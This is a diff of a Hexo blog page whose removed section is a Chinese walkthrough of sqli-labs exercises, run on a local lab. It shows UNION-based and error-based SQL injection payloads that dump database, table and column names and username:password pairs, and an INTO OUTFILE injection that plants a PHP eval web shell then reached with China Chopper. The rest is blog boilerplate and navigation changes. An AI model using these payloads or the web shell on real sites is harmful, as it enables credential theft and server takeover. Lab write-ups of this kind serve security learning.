-<p>输入id=1’ order by 3–+发现页面返回了用户的name password 说明当前数据库的列数刚好等于3，下面就可以构造 select 1，2，3 ***** 来获取数据库的相应信息了。</p>
-<p><strong>3.利用 information_schema库</strong></p>
-<p>如果继续学习sql注入就会发现select语句经常会用到information_schema这个库来获取数据库的（表，列，字段）的信息。information_schema是mysql自带的数据库，只要用户安装了mysql，在安装的同时，information<br>_schema这个数据库就会安装到用户的系统中.</p>
-<p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。也就是说information_schema中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。因此，在sql注入中就可以利用information_schema这个库获取其他数据库的信息.</p>
-<p>SCHEMATA表:</p>
-<p>SCHEMATA 表存储了 Mysql 数据库中所有库相关的信息，比如订单库、用户库这种不同的库。可以在mysql命令行中使用下述语句进行查看：</p>
-<p>select * from information_schema.schemata;</p>
-<p>TABLES表:<br>TABLES 表存储了 Mysql 数据库中表的信息。会记录这张表是属于哪个数据库(TABLE_SCHEMA)，是做什么的表(表注释)，多会创建的(CREATE_TIME)，有多少行数据(INDEX_LENGTH)等信息。</p>
-<p>select* frominformation_schema.TABLES;</p>
-<p>COLUMNS表:</p>
-<p>COLUMNS 表存储了 Mysql 数据库中每张表中的列信息。会记录这列是属于哪张表(TABLE_NAME)、以及哪个库(TABLE_SCHEMA)、这列的数据类型是什么、列的注释(COLUMN_COMMENT)等信息。</p>
-<p>select* frominformation_schema.COLUMNS<br>COLUMNS 表中字段 COLUMN_COMMENT 是关于列的注释信息，一般会标明这个列是什么字段，不同的数字代表什么含义(0代表什么、1代表什么)。</p>
-<p><strong>4.开始注入</strong></p>
-<p>获取数据库的名字:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+//group_concat()函数是把一组中的非NULL字符串合并为一个字符串的函数</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005181042833.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取security数据库的表名:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=&apos;security&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190150598.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取users表的列:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(column_name),3 from infromation_schema.columns where  table_name=&apos;users&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/2019100519070977.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>获取username ,password:</p>
-<pre><code>?id=-1&apos; union select 1,group_concat(concat_ws(&apos;:&apos;,username,password)),3 from users--+//concat_ws函数是把一组非NULL字符串拼接为一个字符串，与concat函数相比主要不同是可以一次指定分隔符</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190933714.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<h2 id="0x07less05报错注入"><a href="#0x07less05报错注入" class="headerlink" title="#0x07less05报错注入"></a>#0x07less05报错注入</h2><p>这关如果直接用联合查询的话,页面只会返回”You are in”,而不能返回数据库的信息。这时我们就可以尝试别的方法,比如时间注入,报错注入,布尔注入等等。在这一关可以使用报错注入来返回数据库的信息。</p>
-<p><strong>1报错注入的原理:</strong></p>
-<p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容；如果能让错误信息中返回数据库中的内容，即实现SQL注入。</p>
-<p><strong>2.利用group by和rand()的冲突直接报错注入</strong></p>
-<p>group by的作用和order by的作用类似,都是对结果集排序(默认升序).而rand()是产生随机数的函数,类似于java的Math.random()。产生一个[0,1)区间的数.如rand()*2,则产生一个[0,2)区间的数。当rand() 和order by 在一起使用时，就会发生冲突。</p>
-<p>由于rand和order+by的冲突，即rand()是不可以作为order by的条件字段,同理 也不可以为group by的条件字段。floor(rand(0)*2) 获取不确定又重复的值造成mysql的错误</p>
-<p>rand和group by冲突的具体原因</p>
-<p><strong>3.开始注入</strong></p>
-<p>获取数据库的名字：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select database()),&apos;:&apos;,floor(rand()*2))a from information_schema.schemata group by a--+//</code></pre><p>其中concat函数的作用和之前group_concat()函数类似也是把一组非NULL字符串拼接为一个字符串。a是 as a的别名。然后返回值不能超过1行数据，所以如果里面的select获取的是多行数据时要加limit（查询多组用limit选择）</p>
-<p>获取表：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from information_schema.tables  group by a--+</code></pre><p>获取列：</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select column_name  from   information_schema.columns where table_name=&apos;users&apos;limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from   information_schema.columns  group by a--+</code></pre><p>获取username， password:</p>
-<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select concat_ws(&apos;`&apos;,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0*2))) a from users group by a--+</code></pre><p>有关报错注入的方法还有很多，这里就不详细介绍了。</p>
-<h2 id="0x08less07上传一句话木马"><a href="#0x08less07上传一句话木马" class="headerlink" title="#0x08less07上传一句话木马"></a>#0x08less07上传一句话木马</h2><p>先在id=1后加上单引号和双引号，页面都显示正常，但是在参数后加上注释，会报错，说明系统过滤注释符。并且sql语句id参数前后很有可能加了（），尝试了很多次发现构造:“id’ =1 ))”,可以使注释不被过滤。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191009171549118.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>但是之后尝试 union,报错注入发现不能返回需要的信息（可以用布尔和时间盲注）。不过，本题提示利用file权限向服务器传入文件。那么，先看看是否能传入<br>构造语句：<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1’" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’</a>)) and (select count(*) from mysql.user)&gt;0–<br>返回正常说明我们有这个权限.<br><img src="https://img-blog.csdnimg.cn/20191009172804632.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>然后把一句话木马发送到网页，构造语句：id=-1’)) union select 1,2,”&lt;?php</p>
-<p>@eval($_POST[‘shell’])?&gt; into outfile “<strong><strong>* \test.php” (**</strong></strong>为网页的目录,test.php为上传的一句话木马文件）。<br>连上中国菜刀，发现能够连接成功，说明注入成功（网页根目录有一句话木马说明上传成功）。</p>
-<h2 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/10/22/新文档/" data-id="ck7sz7knd000aw4v9rqi0flkv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/06/04/hello-world/" class="article-date">
-  <time datetime="2019-06-04T10:51:05.224Z" itemprop="datePublished">2019-06-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/04/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/06/04/hello-world/" data-id="ck7sz7kmu0005w4v9zd15ecow" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ck9gz156g000a9sv9acuvlj5f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1332,6 +1236,11 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -1349,7 +1258,7 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
     </div>
   </div>
 
@@ -1362,23 +1271,23 @@ if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
       <ul>
         
           <li>
-            <a href="/2020/03/15/tie-san-webshell/">tie-san-webshell</a>
+            <a href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
           </li>
         
           <li>
-            <a href="/2020/03/15/python-urllib/">python urllib</a>
+            <a href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
           </li>
         
           <li>
-            <a href="/2020/03/15/buuoj-Hack-World-easy-tornado/">buuoj Hack World  easy_tornado</a>
+            <a href="/2020/04/25/SWPUCTF2019 web1/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2020/03/10/leetcode-dynamic-programming-2/">leetcode-dynamic programming-2</a>
+            <a href="/2020/04/13/JPA初学问题总结/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2020/03/08/leetcode-动态规划-2/">(no title)</a>
+            <a href="/2020/04/11/python序列化及反序列化/">(no title)</a>
           </li>
         
       </ul>
